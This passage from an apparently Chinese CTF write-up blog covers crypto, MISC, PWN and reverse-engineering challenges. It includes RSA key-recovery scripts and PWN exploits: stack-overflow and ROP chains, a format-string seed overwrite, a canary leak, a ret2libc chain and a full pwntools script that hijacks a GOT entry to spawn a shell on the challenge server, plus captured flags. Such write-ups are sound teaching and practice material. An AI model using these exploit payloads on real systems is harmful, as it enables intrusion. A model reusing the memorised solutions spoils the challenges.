<span class="keyword">as</span> gp</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">c = <span class="number">167991288045303000655678332469702456156006927056795988184486782639594811154157430883888171768898616013017469226146528316669411009693161813068877601341794154799154579698061130344409936572057393406182997791983691902804474594459551816221476117792337686268697787228149355295256968844786104832801764130261045846806268887759441150366851268084155967124558636130241419050274900078069517490749660442582935909745378880450868778768818202112172222446341661337699089743565266</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = <span class="number">1141574900469012067636252180723835763151920736282470632700965427450254174708499891391924201142298374181693031433288816864153023177804715482450166860015258287506501285068163017195211966134698458111181058182005585938681465830111118867709096243399041372276386809721333892464112085735367452600541715292290079220522270815111077388426606567096816463177229069700881806969035414147663217609196771833717652147248133905228806566277089964340350926709132880091484440081291867</span></span><br><span class="line">phi = <span class="number">1141574900469012067636252180723835763151920736282470632700965427450254174708499891391924201142298374181693031433288816864153023177804715482450166860015258165887575210803576766535149248650990306655744681050265422300794686668511098707335740896061248758188315389043730123141479632359506080499922725994127962549611715479724233268459284756489870354300620746588895051518136083710196648747569108450588260775600203396574920477102242310852948444452793222038768500472297680</span></span><br><span class="line"></span><br><span class="line">d = gp.invert(e, phi)</span><br><span class="line">print(<span class="string">&#x27;d&#x27;</span>, d)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">print(<span class="string">&#x27;m&#x27;</span>, m)</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line">n = pq</span><br><span class="line"><span class="comment">### phi = (p-1)(q-1)</span></span><br><span class="line"><span class="comment">### n - phi + 1 = p+q</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### test</span></span><br><span class="line"></span><br><span class="line">P = <span class="number">121618926074264586250660062717483708151455436377131740163637886779161600020160373355347337792614088071420677603769322632453375861372100618989298162116670901168844835431684122510308101626830874030385270764873493826054277915478373240766932152213777194695079182488548060121093678996054045752057031784605984583657</span></span><br><span class="line">Q = <span class="number">9386490551412435844811502505319278002577937841221881957073276159551090488386896450977177594453235429471397541114726559808406428210587601020931333624410531</span></span><br><span class="line"></span><br><span class="line">N = P*Q</span><br><span class="line">PHI = (P-<span class="number">1</span>)*(Q-<span class="number">1</span>)</span><br><span class="line">E = <span class="number">0x10001</span></span><br><span class="line">D = gp.invert(E, PHI)</span><br><span class="line">C = <span class="built_in">pow</span>(m, E, N)</span><br><span class="line">print(C == c)</span><br><span class="line">M = <span class="built_in">pow</span>(c, D, N)</span><br><span class="line">print(long_to_bytes(M))</span><br></pre></td></tr></table></figure>

<p>第二个脚本，解flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> prevprime, nextprime</span><br><span class="line"></span><br><span class="line"><span class="comment">### know</span></span><br><span class="line">c = <span class="number">29481634166275444081755526650435050746177271929108540340839636645290382212801883156176249297905065394477723980727035074018048212479803055923507504121830977544547768817541693745091881774043457256431594076739380675412845360130106309932588508902347792967474645133565825400509525159035854284711152310367992325935</span></span><br><span class="line">dp = <span class="number">8488018598582161778909675874955311952104108410770019733352933135643797561752804534164335792268466126138022884715691928735179876112592458061466852929011221</span></span><br><span class="line">dq = <span class="number">1804557936862041610503694621208928380602760766763762174784442626117998593478392526552839638322965598840334590533505416988939157674783742124641579057347585</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"><span class="comment">### from s2.py</span></span><br><span class="line">P = <span class="number">121618926074264586250660062717483708151455436377131740163637886779161600020160373355347337792614088071420677603769322632453375861372100618989298162116670901168844835431684122510308101626830874030385270764873493826054277915478373240766932152213777194695079182488548060121093678996054045752057031784605984583657</span></span><br><span class="line"><span class="comment">### known</span></span><br><span class="line">phi1 = <span class="number">121618926074264586250660062717483708151455436377131740163637886779161600020160373355347337792614088071420677603769322632453375861372100618989298162116670901168844835431684122510308101626830874030385270764873493826054277915478373240766932152213777194695079182488548060121093678996054045752057031784605984580709</span></span><br><span class="line">phi2 = <span class="number">14791163179457434444794516008567747647481303154854379011669786795227420724280194789275852623687083215283362389785521435675635086985421541180045676277059133761026503234930139783585424177770093774298344633019455696732427486555045266582452534884374013066166218727210717017471654996534132389375716815039737309422629330481627790753048488473591834571187285222137701096156433851572403219503404745764359756858453750475644478848507148119634603762692031495081180813557541978095885608362527785904217182231158501737362821598389883245856723022310689702037117899117551792218810829198381549179717721512988616131869821769062534942681</span></span><br><span class="line">p = <span class="number">11028097119370348846286892427281754875005887017101518244017905295402394052666300915021769057886254797761936596400069424953758446151837197652241250156786179</span></span><br><span class="line">q = <span class="number">11028097119370348846286892427281754875005887017101518244017905295402394052666300915021769057886254797761936596400069424953758446151837197652241250156787457</span></span><br><span class="line">n = <span class="number">121618926074264586250660062717483708151455436377131740163637886779161600020160373355347337792614088071420677603769322632453375861372100618989298162116670923225039074172381815084092956190340624042159304967909981861864868720266478573368762195751892967204674706361740860259943586512946349426452336267106298156803</span></span><br><span class="line">phi = <span class="number">121618926074264586250660062717483708151455436377131740163637886779161600020160373355347337792614088071420677603769322632453375861372100618989298162116670901168844835431684122510308101626830874030385270764873493826054277915478373240766932152213777194695079182488548060121093678996054045752057031784605984583168</span></span><br><span class="line">d = <span class="number">4435192842478178145766171016292873681767222987645831499627608059602914751181520245346600200258596983241457794421604301258274994410475311341447161259423584445329190482959626665847328423457372002572909915437808417295111528113787815210231897154140828773383573342503164070516103770397930472060306482829673362433</span></span><br><span class="line">m = <span class="number">9651118480623774404727104938043947709060758201052623399972630017760852142422397</span></span><br><span class="line"></span><br><span class="line">phi1 = prevprime(P)</span><br><span class="line">print(<span class="string">&#x27;phi1 =&#x27;</span>, phi1)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f1b</span>():</span></span><br><span class="line">    i_phi1 = gp.iroot(phi1, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    p2 = prevprime(i_phi1)</span><br><span class="line">    p1 = prevprime(p2)</span><br><span class="line">    phi_ = (p1-<span class="number">1</span>)*(p2-<span class="number">1</span>)</span><br><span class="line">    d1 = gp.invert(e, phi_)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>((dp+dq) != ((d1%(p1-<span class="number">1</span>)) + (d1%(p2-<span class="number">1</span>)))):</span><br><span class="line">        less, great = phi_ &lt; P, phi_ &gt; phi1</span><br><span class="line">        print(<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;less&#x27;</span>, less, <span class="string">&#x27;great&#x27;</span>, great, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> less:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        p1, p2 = p2, nextprime(p2)</span><br><span class="line">        phi_ = (p1-<span class="number">1</span>)*(p2-<span class="number">1</span>)</span><br><span class="line">        d1 = gp.invert(e, phi_)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&#x27;got&#x27;</span>)</span><br><span class="line">        print(m)</span><br><span class="line">        print(long_to_bytes(<span class="built_in">pow</span>(c, d1, p1*p2)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f1b()</span><br></pre></td></tr></table></figure>

<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="一叶障目"><a href="#一叶障目" class="headerlink" title="一叶障目"></a>一叶障目</h3><p>ps即可</p>
<h3 id="壮言壮语"><a href="#壮言壮语" class="headerlink" title="壮言壮语"></a>壮言壮语</h3><p>与佛论禅</p>
<h3 id="秘技·反复横跳"><a href="#秘技·反复横跳" class="headerlink" title="秘技·反复横跳"></a>秘技·反复横跳</h3><p>用软件一分就行了</p>
<h3 id="来拼图"><a href="#来拼图" class="headerlink" title="来拼图"></a>来拼图</h3><p>手动筛选有字的块<br>然后ppt拼图</p>
<h3 id="飞翔的刘壮"><a href="#飞翔的刘壮" class="headerlink" title="飞翔的刘壮"></a>飞翔的刘壮</h3><p>十分的时候死就行了</p>
<h3 id="吉普赛的歌姬"><a href="#吉普赛的歌姬" class="headerlink" title="吉普赛的歌姬"></a>吉普赛的歌姬</h3><p>qq里面有名字生日，dddd</p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="数学咋样"><a href="#数学咋样" class="headerlink" title="数学咋样?"></a>数学咋样?</h3><blockquote>
<p>知识点<br>使用pwntools通信<br>(vm虚拟机使用, 及linux安装)</p>
</blockquote>
<h4 id="简介-7"><a href="#简介-7" class="headerlink" title="简介"></a>简介</h4><p>不会吧， 不会吧，不会有人上了大学, 连加法都做不来吧？ 题目端口： nc 81.69.0.47 1111</p>
<h4 id="提示-6"><a href="#提示-6" class="headerlink" title="提示"></a>提示</h4><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3944">https://xz.aliyun.com/t/3944</a><br><a target="_blank" rel="noopener" href="http://docs.pwntools.com/en/stable/index.html">http://docs.pwntools.com/en/stable/index.html</a><br><a target="_blank" rel="noopener" href="https://www.vmware.com/products/workstation-pro/workstation-pro-evaluation.html">https://www.vmware.com/products/workstation-pro/workstation-pro-evaluation.html</a><br><a target="_blank" rel="noopener" href="https://ubuntu.com/download">https://ubuntu.com/download</a></p>
<h4 id="解题-7"><a href="#解题-7" class="headerlink" title="解题"></a>解题</h4><p>关于安装pwntools, 这里建议使用ubuntu18年版本, 20版本可能会因部分包版本过高导致pwntools安装失败<br>然后通信发现这就是很简单的接受消息, 消息包含两个数字，加起来发回去, 这个过程重复20次<br>所以写脚本自动发送<br>关键代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = conn.recvline(timeout=<span class="number">1</span>)</span><br><span class="line"><span class="comment">### b&#x27;![0]  num_1 = 713, num_2 = 137\n&#x27;</span></span><br><span class="line">s = <span class="built_in">str</span>(a, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">s = s.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">s = <span class="built_in">str</span>(<span class="built_in">int</span>(s[<span class="number">4</span>][:-<span class="number">1</span>])+<span class="built_in">int</span>(s[<span class="number">7</span>][:-<span class="number">1</span>]))</span><br><span class="line">conn.sendline(s)</span><br></pre></td></tr></table></figure>

<p>循环20次得到SYC{O==[]=====&gt;l1u_zhu@ng}</p>
<h3 id="liuzhuang-secret"><a href="#liuzhuang-secret" class="headerlink" title="liuzhuang-secret"></a>liuzhuang-secret</h3><blockquote>
<p>知识点:<br>栈溢出原理, ROP, 64位寄存器传参</p>
</blockquote>
<h4 id="简介-8"><a href="#简介-8" class="headerlink" title="简介"></a>简介</h4><p>题目端口： nc 81.69.0.47 1000</p>
<h4 id="提示-7"><a href="#提示-7" class="headerlink" title="提示"></a>提示</h4><p>铁汁们，了解过rop技术么<br><a target="_blank" rel="noopener" href="http://www.vuln.cn/6642">http://www.vuln.cn/6642</a><br><a target="_blank" rel="noopener" href="https://github.com/pwndbg/pwndbg">https://github.com/pwndbg/pwndbg</a><br><a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/pwn/readme-zh/">https://ctf-wiki.github.io/ctf-wiki/pwn/readme-zh/</a></p>
<h4 id="解题-8"><a href="#解题-8" class="headerlink" title="解题"></a>解题</h4><p>首先检查，程序是64位<br>使用ida分析提供的程序<br>main函数中有一行存在栈溢出的代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gets(&amp;v4, <span class="number">0L</span>L);</span><br></pre></td></tr></table></figure>

<h4 id="确认覆盖地址"><a href="#确认覆盖地址" class="headerlink" title="确认覆盖地址"></a>确认覆盖地址</h4><p>首先确定需要覆盖的地址<br>使用cyclic得到是120个字</p>
<h4 id="搜集组件"><a href="#搜集组件" class="headerlink" title="搜集组件"></a>搜集组件</h4><p>然后在ida中搜system找到system起始位置<br>使用交叉引用找到sub_40076b调用了system<br>发现程序直接调用system(‘/bin/sh’)<br>既然如此, 直接跳转到该地址即可<br>payload = ‘A’ * 120 + target_addr</p>
<p>cat flag得到SYC{0H_you_b3come_A_PWNer}</p>
<h4 id="更复杂的解法-构造ROP链"><a href="#更复杂的解法-构造ROP链" class="headerlink" title="更复杂的解法: 构造ROP链"></a>更复杂的解法: 构造ROP链</h4><p>payload = padding + pop_rdi + binsh_addr + system_addr</p>
<h3 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h3><blockquote>
<p>知识点:<br>格式化字符串漏洞</p>
</blockquote>
<h4 id="简介-9"><a href="#简介-9" class="headerlink" title="简介"></a>简介</h4><p>题目地址： nc 81.69.0.47 2222</p>
<h4 id="提示-8"><a href="#提示-8" class="headerlink" title="提示"></a>提示</h4><p>格式化字符串漏洞！<br><a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_intro-zh/">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_intro-zh/</a></p>
<h4 id="解题-9"><a href="#解题-9" class="headerlink" title="解题"></a>解题</h4><p>提供一个64位程序<br>ida分析发现一个格式化字符串漏洞</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">read(<span class="number">0</span>, &amp;buf, <span class="number">0x30</span>uLL);</span><br><span class="line"><span class="built_in">printf</span>(&amp;buf, &amp;buf);</span><br></pre></td></tr></table></figure>

<p>程序逻辑</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">seed = time()</span><br><span class="line"><span class="comment">// 格式化字符串漏洞</span></span><br><span class="line">srand(seed)</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">16</span>; i++)</span><br><span class="line">	<span class="comment">// 输入需等于rand()</span></span><br></pre></td></tr></table></figure>

<p>解题思路是通过漏洞把seed变成固定值, 写一个c程序预测随机数结果, 然后输入</p>
<p>首先通过payload = ‘aa%d.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p’<br>得到字符串起始位置在第7个参数的位置, 所以把seed_addr放到第八个参数的位置<br>payload = b’a’ + b’%0d%8$n’ + p64(seed_addr)</p>
<p>seed_addr地址通过gdb调试可以找到</p>
<h4 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h4><p>暴露seed的值, 然后根据这个值预测随机数</p>
<h3 id="runcode"><a href="#runcode" class="headerlink" title="runcode"></a>runcode</h3><h4 id="非期望解"><a href="#非期望解" class="headerlink" title="非期望解"></a>非期望解</h4><p>直接使用c语言文件输入输出</p>
<h3 id="baby-canary"><a href="#baby-canary" class="headerlink" title="baby_canary"></a>baby_canary</h3><blockquote>
<p>知识点:<br>栈溢出, canary</p>
</blockquote>
<h4 id="简介-10"><a href="#简介-10" class="headerlink" title="简介"></a>简介</h4><p>nc 81.69.0.47 3333</p>
<h4 id="解题-10"><a href="#解题-10" class="headerlink" title="解题"></a>解题</h4><p>存在两次栈溢出漏洞(puts函数会一直输出直到零截断)<br>第一次利用栈溢出以及puts暴露canary的值，第二次利用栈溢出覆盖</p>
<p>gdb单步调试找到canary的位置, 减去字符串起始位置得到偏移<br>0x7fffffffde88 - 0x7fffffffde20 = 104<br>canary低1位为\x00，本来应该加1字防止0截至<br>不用加1字，是因为多了个\n把canary低1位给覆盖了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">104</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(payload1)</span><br><span class="line">canary = u64(p.recv(<span class="number">8</span>)) - <span class="number">0xa</span></span><br></pre></td></tr></table></figure>

<p>ida里搜索得到system地址和’/bin/sh’地址，ROPgadget找到pop rdi的地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload2 &#x3D; b&#39;a&#39;*104 + p64(canary) + b&#39;a&#39;*8 + poprdi_add + binsh_add + sys_add</span><br></pre></td></tr></table></figure>

<p>cat flag得到SYC{C4nary_1s_s0_Funny!!!}</p>
<h3 id="pwn111"><a href="#pwn111" class="headerlink" title="pwn111"></a>pwn111</h3><blockquote>
<p>知识点:<br>ROP, ret2libc, plt和got</p>
</blockquote>
<h4 id="简介-11"><a href="#简介-11" class="headerlink" title="简介"></a>简介</h4><p>题目地址： nc 81.69.0.47 1122 题目描述： 这不整一个rop？</p>
<h4 id="解题-11"><a href="#解题-11" class="headerlink" title="解题"></a>解题</h4><p>提供64位程序和libc文件<br>system和bin/sh都在libc中<br>首先获得libc的偏移, 然后构造rop链</p>
<p>利用write函数暴露某个已绑定的函数地址<br>write参数列表: rdi: 1; rsi: 输出内容地址; rdx: 输出长度</p>
<p>获取偏移有两种方法</p>
<h4 id="方法一-多次pop"><a href="#方法一-多次pop" class="headerlink" title="方法一: 多次pop"></a>方法一: 多次pop</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">136</span> + pop_rdi + p64(<span class="number">1</span>) + pop_rsi_r15 + p64(read_got) + p64(<span class="number">0</span>) + p64(write_plt) + p64(main)</span><br></pre></td></tr></table></figure>

<h4 id="方法二-3参数ROP"><a href="#方法二-3参数ROP" class="headerlink" title="方法二: 3参数ROP"></a>方法二: 3参数ROP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:401210 mov rdx, r14</span><br><span class="line">.text:401213 mov rsi, r13</span><br><span class="line">.text:401216 mov edi, r12d</span><br><span class="line">.text:401219 call qword ptr [r15+rbx*8]</span><br><span class="line">.text:40121D add rbx, 1</span><br><span class="line">.text:401221 cmp rbp, rbx</span><br><span class="line">.text:401224 jnz short loc_401210</span><br><span class="line">.text:401226 add rsp, 8</span><br><span class="line">.text:40122A pop rbx</span><br><span class="line">.text:40122B pop rbp</span><br><span class="line">.text:40122C pop r12</span><br><span class="line">.text:40122E pop r13</span><br><span class="line">.text:401230 pop r14</span><br><span class="line">.text:401232 pop r15</span><br><span class="line">.text:401234 retn</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pop_r = p64(<span class="number">0x40122C</span>) + p64(<span class="number">1</span>) + p64(read_got) + p64(<span class="number">8</span>) + p64(write_got)</span><br><span class="line">mov_r = p64(<span class="number">0x401210</span>)</span><br><span class="line">pad = <span class="string">b&#x27;a&#x27;</span>*<span class="number">128</span> + p64(<span class="number">1</span>)</span><br><span class="line">payload1 = pad + pop_r + mov_r + p64(<span class="number">0</span>)*<span class="number">7</span> + p64(main)</span><br></pre></td></tr></table></figure>

<p>偏移 = 暴露地址 - libc地址<br>然后只需要在libc的地址上加上偏移即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">read_libc = libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">offset = read_add - read_libc</span><br><span class="line">sys_add = libc.symbols[<span class="string">&#x27;system&#x27;</span>] + offset</span><br><span class="line">binsh_add = <span class="number">0x18ce17</span> + offset</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">136</span> + pop_rdi + p64(binsh_add) + p64(sys_add) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br></pre></td></tr></table></figure>

<p>需注意的是要发送str而不是bytes，否则会失败，原因未知<br>sendline(payload.decode(“iso-8859-1”))</p>
<h3 id="pwn222"><a href="#pwn222" class="headerlink" title="pwn222"></a>pwn222</h3><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>system在realpath旁边</p>
<ul>
<li>调用realpath，为got赋值</li>
<li>修改realpath的got，变成system</li>
<li>往bss段写入’/bin/sh’</li>
<li>执行realpath(‘/bin/sh’)（system(‘/bin/sh’)）</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">st = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;81.69.0.47&#x27;</span>, <span class="number">1122</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### p = process(&#x27;./p7&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./p7&#x27;</span>)</span><br><span class="line">elflibc = ELF(<span class="string">&#x27;./libc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">40</span></span><br><span class="line"></span><br><span class="line">main = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">hint_addr = <span class="number">0x4011AC</span></span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">realpath_plt = elf.plt[<span class="string">&#x27;realpath&#x27;</span>]</span><br><span class="line">realpath_got = elf.got[<span class="string">&#x27;realpath&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x401233</span></span><br><span class="line">bss_addr = <span class="number">0x404040</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### 1.1 plt realpath</span></span><br><span class="line">call_realpath = p64(hint_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">### 1.2 realpath -&gt; system</span></span><br><span class="line">pop_6 = p64(<span class="number">0x40122A</span>)+p64(<span class="number">0xffffffffffffffd0</span>)+p64(realpath_got+<span class="number">0x3d</span>)+p64(read_got)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">add_r = p64(<span class="number">0x40112c</span>) <span class="comment"># add</span></span><br><span class="line">call_add = pop_6 + add_r</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*offset + call_realpath + call_add + p64(main)</span><br><span class="line">p.sendline(payload.decode(<span class="string">&quot;iso-8859-1&quot;</span>))</span><br><span class="line">print(<span class="string">&#x27;111&#x27;</span>)</span><br><span class="line">sleep(st)</span><br><span class="line"></span><br><span class="line"><span class="comment">### 2.1 read /bin/sh (rbx, rbp, edi, rsi, rdx, ret)</span></span><br><span class="line">pop_6 = p64(<span class="number">0x40122a</span>)+ p64(<span class="number">0</span>)+p64(<span class="number">1</span>) + p64(<span class="number">0</span>)+p64(bss_addr)+p64(<span class="number">8</span>)+p64(read_got)</span><br><span class="line">mov_4 = p64(<span class="number">0x401210</span>)</span><br><span class="line">read_bs = pop_6+mov_4+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### 2.2 call system</span></span><br><span class="line">call_system = p64(pop_rdi) + p64(bss_addr) + p64(realpath_plt) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(offset-<span class="number">8</span>) + p64(<span class="number">1</span>) + read_bs + call_system</span><br><span class="line">p.sendline(payload.decode(<span class="string">&quot;iso-8859-1&quot;</span>))</span><br><span class="line">print(<span class="string">&#x27;222&#x27;</span>)</span><br><span class="line">sleep(st)</span><br><span class="line"></span><br><span class="line"><span class="comment">### 3 send</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">print(<span class="string">&#x27;333&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep(st)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="No-RE-no-gain"><a href="#No-RE-no-gain" class="headerlink" title="No RE no gain"></a>No RE no gain</h3><p>ida直接搜索字符串，明文flag</p>
<h3 id="我真的不会写驱动"><a href="#我真的不会写驱动" class="headerlink" title="我真的不会写驱动"></a>我真的不会写驱动</h3><p>ida直接搜索字符串，明文flag</p>
<h3 id="re00"><a href="#re00" class="headerlink" title="re00"></a>re00</h3><p>ida分析只进行了个异或运算<br>用python写个脚本即可<br>脚本见/re03/s.py</p>
<h3 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h3><p>搜索字符串+交叉引用找到主要代码在sub_401a10<br>反编译发现代码逻辑为在一个一维数组中移动<br>并将此一维数组解释位长31的二维数组</p>
<p>找到对应数组位置，数组前面应该再加个空格以便对齐起点和字符’s’的位置</p>
<p>如何就是走迷宫了，具体代码见/re04/s.pys.py</p>
<h3 id="Hello-NET"><a href="#Hello-NET" class="headerlink" title="Hello .NET"></a>Hello .NET</h3><p>使用ILSpy反汇编<br>在WpfAppCS -&gt; WpfAppCS -&gt; MainWindow -&gt; Check是构造flag的代码<br>用python写脚本解出flag，脚本见/re05/s.py</p>
<h3 id="刘壮的BaseXX"><a href="#刘壮的BaseXX" class="headerlink" title="刘壮的BaseXX"></a>刘壮的BaseXX</h3><p>流程：<br>把flag高低四位位互换<br>然后与i异或<br>然后base64encode（更换码表）<br>再与目标字符串比较</p>
<p>逆向做一遍即可，代码见/re06/r.py</p>
<h3 id="WhatsApk"><a href="#WhatsApk" class="headerlink" title="WhatsApk"></a>WhatsApk</h3><p>value -&gt; string里有明文flag</p>
<h3 id="HelloAndroid"><a href="#HelloAndroid" class="headerlink" title="HelloAndroid"></a>HelloAndroid</h3><p>找到主函数位置，直接能看到明文flag</p>
<h3 id="Easy-virus"><a href="#Easy-virus" class="headerlink" title="Easy_virus"></a>Easy_virus</h3><h4 id="提示-9"><a href="#提示-9" class="headerlink" title="提示"></a>提示</h4><p>提示文件是个图片，是PE文件格式总结</p>
